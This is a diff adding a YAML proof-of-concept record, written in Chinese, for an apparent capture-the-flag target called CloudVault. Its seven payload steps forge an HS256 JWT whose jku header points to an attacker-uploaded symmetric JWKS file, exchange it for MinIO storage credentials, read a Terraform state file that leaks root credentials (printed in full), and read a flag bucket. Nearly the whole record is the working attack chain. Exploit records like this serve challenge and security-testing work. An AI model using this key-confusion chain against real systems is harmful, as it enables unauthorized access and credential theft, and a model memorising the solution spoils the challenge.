@@ -1,0 +1,31 @@
+info:
+  name: cloudvault_jwt_jwks_federation
+  cve: ''
+  summary: CloudVault 云存储网关：通过 JWT 联邦交换（HS256+JWKS 对称密钥）获取 MinIO 受限凭证，再读 tfstate 泄露
+    root 凭证访问 secrets-vault 桶拿 flag
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: CloudVault 云存储网关：通过 JWT 联邦交换（HS256+JWKS 对称密钥）获取 MinIO 受限凭证，再读 tfstate
+    泄露 root 凭证访问 secrets-vault 桶拿 flag
+  steps:
+  - 注册登录→上传JWKS→构造HS256联邦JWT→exchange→读tfstate→root凭证→读flag桶
+  payload: '1. 注册/登录获取有效 JWT: POST /api/auth/register {username,password} → token
+
+    2. 上传对称密钥 JWKS: POST /api/files/upload {filename,content} 内容 {"keys":[{"kty":"oct","alg":"HS256","kid":"hs","k":"<b64secret>"}]}
+    → public_url
+
+    3. 构造 HS256 JWT: header {alg:HS256,kid:hs,jku:/files/shared-assets/users/1/hs_jwks.json},
+    payload {sub:partner,group:ops,role:ops,exp:9999999999}, 用对称密钥签名
+
+    4. POST /api/sts/exchange {identity_token} → 返回 access_key/secret_key/bucket_scope
+
+    5. 用凭证 POST /api/storage/list 列桶，POST /api/storage/get 读对象
+
+    6. tfstate 泄露 MinIO root: MINIO_ROOT_USER=cvault-admin MINIO_ROOT_PASSWORD=CVault_Adm1n#2026!
+
+    7. 用 root 凭证读 secrets-vault/final/flag.txt'
+  verification: CloudVault 云存储网关：通过 JWT 联邦交换（HS256+JWKS 对称密钥）获取 MinIO 受限凭证，再读 tfstate
+    泄露 root 凭证访问 secrets-vault 桶拿 flag
